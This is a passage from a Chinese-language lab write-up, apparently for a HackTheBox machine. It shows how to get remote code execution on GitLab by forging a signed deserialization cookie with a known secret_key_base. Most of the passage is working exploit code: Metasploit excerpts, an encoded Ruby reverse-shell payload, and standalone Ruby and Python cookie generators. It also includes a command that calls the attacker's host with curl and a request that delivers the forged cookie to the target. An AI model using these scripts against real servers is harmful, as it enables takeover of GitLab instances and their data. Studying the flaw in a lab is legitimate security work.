      <span class="s1">&#39;method&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
      <span class="s1">&#39;cookie&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;experimentation_subject_id=</span><span class="si">#{</span><span class="n">signed_cookie</span><span class="si">}</span><span class="s2">&#34;</span>
    <span class="p">})</span>
  <span class="k">end</span>
</code></pre></div><p>获取secret_key_base的部分就不写了，可以去看下CVE-2020-10977漏洞执行的过程，主要是看下它getshell的部分。<!-- raw HTML omitted -->首先是<code>build_payload</code> 的函数，这里主要是构造要执行的反弹shell。</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby">  <span class="k">def</span> <span class="nf">build_payload</span>
    <span class="n">code</span> <span class="o">=</span> <span class="s2">&#34;eval(&#39;</span><span class="si">#{</span><span class="o">::</span><span class="no">Base64</span><span class="o">.</span><span class="n">strict_encode64</span><span class="p">(</span><span class="n">detached_payload_stub</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encoded</span><span class="p">))</span><span class="si">}</span><span class="s2">&#39;.unpack(&#39;m0&#39;).first)&#34;</span>

    <span class="c1"># Originally created with Active Support 6.x</span>
    <span class="c1">#   code = &#39;`curl 10.10.15.26`&#39;</span>
    <span class="c1">#   erb = ERB.allocate; nil</span>
    <span class="c1">#   erb.instance_variable_set(:@src, code);</span>
    <span class="c1">#   erb.instance_variable_set(:@filename, &#34;1&#34;)</span>
    <span class="c1">#   erb.instance_variable_set(:@lineno, 1)</span>
    <span class="c1">#   value = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &#34;@result&#34;, ActiveSupport::Deprecation.new)</span>
    <span class="c1">#   Marshal.dump(value)</span>
    <span class="s2">&#34;</span><span class="se">\x04\b</span><span class="s2">&#34;</span> <span class="p">\</span>
      <span class="s1">&#39;o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&#39;</span> <span class="p">\</span>
        <span class="s2">&#34;</span><span class="se">\t</span><span class="s2">:</span><span class="se">\x0E</span><span class="s2">@instance&#34;</span> <span class="p">\</span>
          <span class="s2">&#34;o:</span><span class="se">\b</span><span class="s2">ERB&#34;</span> <span class="p">\</span>
            <span class="s2">&#34;</span><span class="se">\b</span><span class="s2">&#34;</span> <span class="p">\</span>
              <span class="s2">&#34;:</span><span class="se">\t</span><span class="s2">@src</span><span class="si">#{</span><span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="o">[</span><span class="mi">2</span><span class="o">..-</span><span class="mi">1</span><span class="o">]</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">\</span>
              <span class="s2">&#34;:</span><span class="se">\x0E</span><span class="s2">@filename</span><span class="se">\&#34;\x06</span><span class="s2">1&#34;</span> <span class="p">\</span>
              <span class="s2">&#34;:</span><span class="se">\f</span><span class="s2">@linenoi</span><span class="se">\x06</span><span class="s2">&#34;</span> <span class="p">\</span>
          <span class="s2">&#34;:</span><span class="se">\f</span><span class="s2">@method:</span><span class="se">\v</span><span class="s2">result&#34;</span> <span class="p">\</span>
          <span class="s2">&#34;:</span><span class="se">\t</span><span class="s2">@var</span><span class="se">\&#34;\f</span><span class="s2">@result&#34;</span> <span class="p">\</span>
        <span class="s2">&#34;:</span><span class="se">\x10</span><span class="s2">@deprecatorIu:</span><span class="se">\x1F</span><span class="s2">ActiveSupport::Deprecation</span><span class="se">\x00\x06</span><span class="s2">:</span><span class="se">\x06</span><span class="s2">ET&#34;</span>
  <span class="k">end</span>
</code></pre></div><p>我从msf中输出执行后的结果，进行base64解码，下面是解码过程：<!-- raw HTML omitted -->第一部分的编码:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="no">BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgg6CUBzcmMiAqcEZXZhbCgnWTI5a1pTQTlJQ2RaTWpscldsTkJPVWxEVlc5Wk1qRlhaVWRTV0dKSWJHRlZNRVoxV1hwSk5XRnRSWGxXYWtKTFpXNVNjVlZHV2xOU1JsWkhWRzVhV2sxdVVuTmFSVTB4WkZad1dWa3lPVXBoYTFZelZFZHdSbVF3ZUhGU1ZFSk5ZVzFrY0ZSRlRrSk5SVFZGVlZSQ1RGWklUbkpaZWs1VFlUSkdXRTVJVm1waVZsb3lXVEJrVjJSVmRFaFVXRUpRWlZaS05scEZaRk5rYlZKWlZWaFdhbUpXV2pKWk1HUlhaRlYwU0ZSWVFsQmxWa28yV2tWa1UySkhUblZUV0ZacVlsWmFNbGt3WkZka1ZYUklWRmhDVUdWV1NqWmFSV1JUWTBkS2NFNVhlRnBXTURWMlYwUktOR05IU25SV2FtUnRVak5uTkZsclVYaGpNSGgxVkdwQ2FtSlhlRE5VZWtreFlrZFdTVlZYWkdoV01XeHVXV3ROTVdNeGNGaE9WelZyVWpKak5WVkdVa0pPTUhSR1lrWkNUV0pyU2pKWk1HUlhaRlYwU0dRelRrcGlhM0J3VTFkc2MwNHlXa2hYYlhSdFVUQktkRmRyVFRGaVJteFlWRzA1V1UxdWFIZFpiVEZXV2pKVmVtVklXbTFSTUVweFZFYzFRMDFYVWtsVVZ6bHBaVlJXTmxwRmFFdGpSMDVFWVRKa2JWZEVRbmRUVldoTFlrZE5lVlJxUm1GVk1Fb3hXVlprTTFveVdsSlFWREJ3VEc1V2RXTkhSbXBoZVdkc1MwY3dkMHRUYTNWYWJXeDVZek5SUzJGWFdXZFZiRlpEVjFZNVVWUkZSbFZTYXpsVFZGTkJPV1pwUVhaaVdFNHpZVmMxT0dKWGJIVmFNMlE0WkRKc2RVMTZTWFpEYld4MVkwTkJPVWxGYkZCTWJrSjJZMGRXZFV0RFZXOWpibFpwWlZOcmMwbERWVzlrTWtsd1MxTkNlVnBZVG1wa1YxVm5ZbTFzYzBOdGJHMUpSMngxWTBGd2NHSnVRWFZrTTBwd1pFZFZiMWt5T1d0YVUydExZVmMxZDB4dFRuTmlNMDVzUTIxV2RWcEJjR3hpU0U1c1EyMXNiVWxEUldkVlNFcDJXVEpXZW1ONU5XMWlNMHB5UzBOclMxcFlXbWhpUTJocVlqSlNiRXRUUW5sYVdFNXFaRmRWWjJKdGJITkRiVloxV2tGd2JHSnRVVDBuTG5WdWNHRmpheWdpYlRBaUtTNW1hWEp6ZEFwcFppQlNWVUpaWDFCTVFWUkdUMUpOSUQxK0lDOXRjM2RwYm54dGFXNW5kM3gzYVc0ek1pOEthVzV3SUQwZ1NVOHVjRzl3Wlc0b0luSjFZbmtpTENBaWQySWlLU0J5WlhOamRXVWdibWxzQ21sbUlHbHVjQXBwYm5BdWQzSnBkR1VvWTI5a1pTa0thVzV3TG1Oc2IzTmxDbVZ1WkFwbGJITmxDa3RsY201bGJDNW1iM0pySUdSdkNtVjJZV3dvWTI5a1pTa0taVzVrQ21WdVpBcDdmUT09Jy51bnBhY2soJ20wJykuZmlyc3QpOg5AZmlsZW5hbWUiBjE6DEBsaW5lbm9pBjoMQG1ldGhvZDoLcmVzdWx0OglAdmFyIgxAcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOgZFVA</span><span class="o">==</span>
</code></pre></div><p>解码后，可以看出还有一段base64：<!-- raw HTML omitted --><img src="https://cdn.nlark.com/yuque/0/2021/png/12507856/1617244802946-5a14056f-6fe9-4597-bd55-c1d749b056f0.png#align=left&amp;display=inline&amp;height=299&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=299&amp;originWidth=1146&amp;size=90389&amp;status=done&amp;style=none&amp;width=1146" alt="image.png"><!-- raw HTML omitted -->继续解码，可以看出还有一层编码：<!-- raw HTML omitted --><img src="https://cdn.nlark.com/yuque/0/2021/png/12507856/1617244858610-ab658225-0e22-436f-86b2-9af3a17cf9f3.png#align=left&amp;display=inline&amp;height=292&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=292&amp;originWidth=1168&amp;size=95281&amp;status=done&amp;style=none&amp;width=1168" alt="image.png"><!-- raw HTML omitted -->还有一层。。。：<!-- raw HTML omitted --><img src="https://cdn.nlark.com/yuque/0/2021/png/12507856/1617244899827-7260a910-a840-4148-9c1a-9136616c1257.png#align=left&amp;display=inline&amp;height=289&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=289&amp;originWidth=1163&amp;size=70821&amp;status=done&amp;style=none&amp;width=1163" alt="image.png"><!-- raw HTML omitted -->再继续，最后可以看出是ruby反弹shell的代码：<!-- raw HTML omitted --><img src="https://cdn.nlark.com/yuque/0/2021/png/12507856/1617244930028-1681a0b6-822d-4540-af5b-42f6993d00ea.png#align=left&amp;display=inline&amp;height=127&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=127&amp;originWidth=1156&amp;size=29689&amp;status=done&amp;style=none&amp;width=1156" alt="image.png"><!-- raw HTML omitted -->上面的过程就是下面这句代码的构造过程，但是我们并不需要这样去构造那么多东西。</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"> <span class="n">code</span> <span class="o">=</span> <span class="s2">&#34;eval(&#39;</span><span class="si">#{</span><span class="o">::</span><span class="no">Base64</span><span class="o">.</span><span class="n">strict_encode64</span><span class="p">(</span><span class="n">detached_payload_stub</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encoded</span><span class="p">))</span><span class="si">}</span><span class="s2">&#39;.unpack(&#39;m0&#39;).first)&#34;</span>
</code></pre></div><p>经过不断的测试和输出调试结果，我提取出了可以构造payload的ruby源码：</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;erb&#39;</span>
<span class="nb">require</span> <span class="s1">&#39;active_support&#39;</span>
<span class="nb">require</span> <span class="s1">&#39;base64&#39;</span>
<span class="nb">require</span> <span class="s1">&#39;openssl&#39;</span>
  <span class="c1"># From Rails</span>
<span class="n">secret_key_base</span><span class="o">=</span><span class="s2">&#34;3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3&#34;</span>
  <span class="k">class</span> <span class="nc">MessageVerifier</span>

    <span class="k">class</span> <span class="nc">InvalidSignature</span> <span class="o">&lt;</span> <span class="no">StandardError</span>
    <span class="k">end</span>

    <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="n">options</span> <span class="o">=</span> <span class="p">{})</span>
      <span class="vi">@secret</span> <span class="o">=</span> <span class="n">secret</span>
      <span class="vi">@digest</span> <span class="o">=</span> <span class="n">options</span><span class="o">[</span><span class="ss">:digest</span><span class="o">]</span> <span class="o">||</span> <span class="s1">&#39;SHA1&#39;</span>
      <span class="vi">@serializer</span> <span class="o">=</span> <span class="n">options</span><span class="o">[</span><span class="ss">:serializer</span><span class="o">]</span> <span class="o">||</span> <span class="no">Marshal</span>
    <span class="k">end</span>

    <span class="k">def</span> <span class="nf">generate</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
      <span class="n">data</span> <span class="o">=</span> <span class="o">::</span><span class="no">Base64</span><span class="o">.</span><span class="n">strict_encode64</span><span class="p">(</span><span class="vi">@serializer</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
      <span class="s2">&#34;</span><span class="si">#{</span><span class="n">data</span><span class="si">}</span><span class="s2">--</span><span class="si">#{</span><span class="n">generate_digest</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
    <span class="k">end</span>

    <span class="k">def</span> <span class="nf">generate_digest</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="nb">require</span> <span class="s1">&#39;openssl&#39;</span> <span class="k">unless</span> <span class="n">defined?</span><span class="p">(</span><span class="no">OpenSSL</span><span class="p">)</span>
      <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">.</span><span class="n">const_get</span><span class="p">(</span><span class="vi">@digest</span><span class="p">)</span><span class="o">.</span><span class="n">new</span><span class="p">,</span> <span class="vi">@secret</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="k">end</span>

  <span class="k">end</span>

  <span class="k">class</span> <span class="nc">NoopSerializer</span>
    <span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
      <span class="n">value</span>
    <span class="k">end</span>
  <span class="k">end</span>

  <span class="k">class</span> <span class="nc">KeyGenerator</span>

    <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="n">options</span> <span class="o">=</span> <span class="p">{})</span>
      <span class="vi">@secret</span> <span class="o">=</span> <span class="n">secret</span>
      <span class="vi">@iterations</span> <span class="o">=</span> <span class="n">options</span><span class="o">[</span><span class="ss">:iterations</span><span class="o">]</span> <span class="o">||</span> <span class="mi">2</span><span class="o">**</span><span class="mi">16</span>
    <span class="k">end</span>

    <span class="k">def</span> <span class="nf">generate_key</span><span class="p">(</span><span class="n">salt</span><span class="p">,</span> <span class="n">key_size</span> <span class="o">=</span> <span class="mi">64</span><span class="p">)</span>
      <span class="no">OpenSSL</span><span class="o">::</span><span class="no">PKCS5</span><span class="o">.</span><span class="n">pbkdf2_hmac_sha1</span><span class="p">(</span><span class="vi">@secret</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="vi">@iterations</span><span class="p">,</span> <span class="n">key_size</span><span class="p">)</span>
    <span class="k">end</span>

  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">sign_payload</span><span class="p">(</span><span class="n">secret_key_base</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">key_generator</span> <span class="o">=</span> <span class="no">KeyGenerator</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">secret_key_base</span><span class="p">,</span> <span class="p">{</span> <span class="ss">iterations</span><span class="p">:</span> <span class="mi">1000</span> <span class="p">})</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">key_generator</span><span class="o">.</span><span class="n">generate_key</span><span class="p">(</span><span class="s1">&#39;signed cookie&#39;</span><span class="p">)</span>
    <span class="n">verifier</span> <span class="o">=</span> <span class="no">MessageVerifier</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="p">{</span> <span class="ss">serializer</span><span class="p">:</span> <span class="no">NoopSerializer</span><span class="o">.</span><span class="n">new</span> <span class="p">})</span>
    <span class="n">verifier</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
  <span class="k">end</span>


<span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;`curl 10.10.14.8`&#39;</span>
<span class="n">erb</span> <span class="o">=</span> <span class="no">ERB</span><span class="o">.</span><span class="n">allocate</span><span class="p">;</span> <span class="kp">nil</span>
<span class="n">erb</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@src</span><span class="p">,</span> <span class="n">code</span><span class="p">);</span>
<span class="n">erb</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@filename</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
<span class="n">erb</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@lineno</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">value</span> <span class="o">=</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">::</span><span class="no">DeprecatedInstanceVariableProxy</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">erb</span><span class="p">,</span> <span class="ss">:result</span><span class="p">,</span> <span class="s2">&#34;@result&#34;</span><span class="p">,</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">.</span><span class="n">new</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
<span class="n">signed_cookie</span> <span class="o">=</span> <span class="n">sign_payload</span><span class="p">(</span><span class="n">secret_key_base</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="nb">puts</span> <span class="n">signed_cookie</span>
</code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h1 id="0x03-用ruby编写生成payload脚本">0x03 用Ruby编写生成payload脚本</h1>
<p>感觉代码太多，我再简化了一下，编写出生成payload的ruby脚本：</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;erb&#39;</span>
<span class="nb">require</span> <span class="s1">&#39;active_support&#39;</span>
<span class="nb">require</span> <span class="s1">&#39;openssl&#39;</span>
<span class="nb">require</span> <span class="s1">&#39;base64&#39;</span>
<span class="n">secret_token</span> <span class="o">=</span> <span class="s2">&#34;3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3&#34;</span>
<span class="n">secret</span><span class="o">=</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">PKCS5</span><span class="o">.</span><span class="n">pbkdf2_hmac_sha1</span><span class="p">(</span><span class="n">secret_token</span><span class="p">,</span> <span class="s1">&#39;signed cookie&#39;</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span><span class="c1">#经过加盐的token</span>
<span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;`curl 10.10.14.8`&#39;</span><span class="c1">#要执行的命令</span>
<span class="c1">#下面是构造序列化的过程</span>
<span class="n">erb</span> <span class="o">=</span> <span class="no">ERB</span><span class="o">.</span><span class="n">allocate</span><span class="p">;</span> <span class="kp">nil</span>
<span class="n">erb</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@src</span><span class="p">,</span> <span class="n">code</span><span class="p">);</span>
<span class="n">erb</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@filename</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
<span class="n">erb</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@lineno</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">value</span> <span class="o">=</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">::</span><span class="no">DeprecatedInstanceVariableProxy</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">erb</span><span class="p">,</span> <span class="ss">:result</span><span class="p">,</span> <span class="s2">&#34;@result&#34;</span><span class="p">,</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">.</span><span class="n">new</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="o">::</span><span class="no">Base64</span><span class="o">.</span><span class="n">strict_encode64</span><span class="p">(</span><span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">value</span><span class="p">))</span><span class="c1">#进行base64编码</span>
<span class="n">cookie_signature</span> <span class="o">=</span> <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">new</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span><span class="c1">#利用base64编码的payload和加盐的token生成签名</span>

<span class="nb">puts</span> <span class="s2">&#34;</span><span class="si">#{</span><span class="n">data</span><span class="si">}</span><span class="s2">--</span><span class="si">#{</span><span class="n">cookie_signature</span><span class="si">}</span><span class="s2">&#34;</span> <span class="c1">#输出结果</span>
</code></pre></div><p>把生成的Cookie进行测试：</p>
<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/users/sign_in</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>

<span class="g">Host: git.laboratory.htb
</span><span class="g">
</span><span class="g">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
</span><span class="g">
</span><span class="g">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
</span><span class="g">
</span><span class="g">Accept-Language: en-US,en;q=0.5
</span><span class="g">
</span><span class="g">Accept-Encoding: gzip, deflate
</span><span class="g">
</span><span class="g">Referer: https://git.laboratory.htb/test/b/issues/1
</span><span class="g">
</span><span class="g">Connection: close
</span><span class="g">
</span><span class="g">Cookie: experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgg6CUBzcmNJIhZgY3VybCAxMC4xMC4xNC44YAY6BkVUOg5AZmlsZW5hbWVJIgYxBjsJVDoMQGxpbmVub2kGOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsJVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsJVA==--279c4777159b8d182330d2117c8774d4b44debe4
</span><span class="g">
</span><span class="g">Upgrade-Insecure-Requests: 1
</span></code></pre></div><p>可以看到已经执行了我们的命令：<!-- raw HTML omitted --><img src="https://cdn.nlark.com/yuque/0/2021/png/12507856/1617245726432-05357e46-86ff-4737-b8d8-31ab52314044.png#align=left&amp;display=inline&amp;height=155&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=155&amp;originWidth=531&amp;size=31623&amp;status=done&amp;style=none&amp;width=531" alt="image.png">
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h1 id="0x04-用python编写生成payload脚本">0x04 用Python编写生成payload脚本</h1>
<p>我感觉Ruby虽然好，但是总感觉Python大法方便以后可以加入各种框架中，遂编写。</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">pbkdf2_hmac</span><span class="p">,</span><span class="n">sha1</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">hmac</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">urllib3</span>
<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
<span class="c1">#经过加盐的key</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">pbkdf2_hmac</span><span class="p">(</span>
    <span class="n">hash_name</span> <span class="o">=</span> <span class="s1">&#39;sha1&#39;</span><span class="p">,</span> 
    <span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3&#34;</span><span class="p">,</span> 
    <span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;signed cookie&#34;</span><span class="p">,</span> <span class="c1">#这个盐是gitlab里面固定的值</span>
    <span class="n">iterations</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">,</span> 
    <span class="n">dklen</span> <span class="o">=</span> <span class="mi">64</span>
<span class="p">)</span>
<span class="c1">#经过序列化的payload</span>
<span class="n">code</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\x04\x08</span><span class="s1">o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy</span><span class="se">\t</span><span class="s1">:</span><span class="se">\x0e</span><span class="s1">@instanceo:</span><span class="se">\x08</span><span class="s1">ERB</span><span class="se">\x08</span><span class="s1">:</span><span class="se">\t</span><span class="s1">@srcI&#34;</span><span class="se">\x16</span><span class="s1">`curl 10.10.14.8`</span><span class="se">\x06</span><span class="s1">:</span><span class="se">\x06</span><span class="s1">ET:</span><span class="se">\x0e</span><span class="s1">@filenameI&#34;</span><span class="se">\x06</span><span class="s1">1</span><span class="se">\x06</span><span class="s1">;</span><span class="se">\t</span><span class="s1">T:</span><span class="se">\x0c</span><span class="s1">@linenoi</span><span class="se">\x06</span><span class="s1">:</span><span class="se">\x0c</span><span class="s1">@method:</span><span class="se">\x0b</span><span class="s1">result:</span><span class="se">\t</span><span class="s1">@varI&#34;</span><span class="se">\x0c</span><span class="s1">@result</span><span class="se">\x06</span><span class="s1">;</span><span class="se">\t</span><span class="s1">T:</span><span class="se">\x10</span><span class="s1">@deprecatorIu:</span><span class="se">\x1f</span><span class="s1">ActiveSupport::Deprecation</span><span class="se">\x00\x06</span><span class="s1">;</span><span class="se">\t</span><span class="s1">T&#39;</span>
<span class="c1">#生成签名</span>
<span class="n">cookie_signature</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">code</span><span class="p">),</span> <span class="n">sha1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;--&#39;</span><span class="o">+</span><span class="n">cookie_signature</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
<span class="c1">#发起攻击</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;experimentation_subject_id&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">}</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://git.laboratory.htb/users/sign_in&#34;</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span>

</code></pre></div><p>中间从Ruby转化为Python卡了，因为生成序列化后的payload这里有编码问题，弄了挺久的。</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby">   <span class="c1"># Originally created with Active Support 6.x</span>
    <span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;`curl 10.10.15.26`&#39;</span>
    <span class="n">erb</span> <span class="o">=</span> <span class="no">ERB</span><span class="o">.</span><span class="n">allocate</span><span class="p">;</span> <span class="kp">nil</span>
    <span class="n">erb</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@src</span><span class="p">,</span> <span class="n">code</span><span class="p">);</span>
    <span class="n">erb</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@filename</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">erb</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="ss">:@lineno</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">value</span> <span class="o">=</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">::</span><span class="no">DeprecatedInstanceVariableProxy</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">erb</span><span class="p">,</span> <span class="ss">:result</span><span class="p">,</span> <span class="s2">&#34;@result&#34;</span><span class="p">,</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">.</span><span class="n">new</span><span class="p">)</span>
    <span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
</code></pre></div><p>上面是msf给的生成序列化的payload代码，下面是序列化后的，替换掉中间的<code>#{Marshal.dump(code)[2..-1]}</code> 生成payload还是有错误。</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"> <span class="s2">&#34;</span><span class="se">\x04\b</span><span class="s2">&#34;</span> <span class="p">\</span>
      <span class="s1">&#39;o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&#39;</span> <span class="p">\</span>
        <span class="s2">&#34;</span><span class="se">\t</span><span class="s2">:</span><span class="se">\x0E</span><span class="s2">@instance&#34;</span> <span class="p">\</span>
          <span class="s2">&#34;o:</span><span class="se">\b</span><span class="s2">ERB&#34;</span> <span class="p">\</span>
            <span class="s2">&#34;</span><span class="se">\b</span><span class="s2">&#34;</span> <span class="p">\</span>
              <span class="s2">&#34;:</span><span class="se">\t</span><span class="s2">@src</span><span class="si">#{</span><span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="o">[</span><span class="mi">2</span><span class="o">..-</span><span class="mi">1</span><span class="o">]</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">\</span>
              <span class="s2">&#34;:</span><span class="se">\x0E</span><span class="s2">@filename</span><span class="se">\&#34;\x06</span><span class="s2">1&#34;</span> <span class="p">\</span>
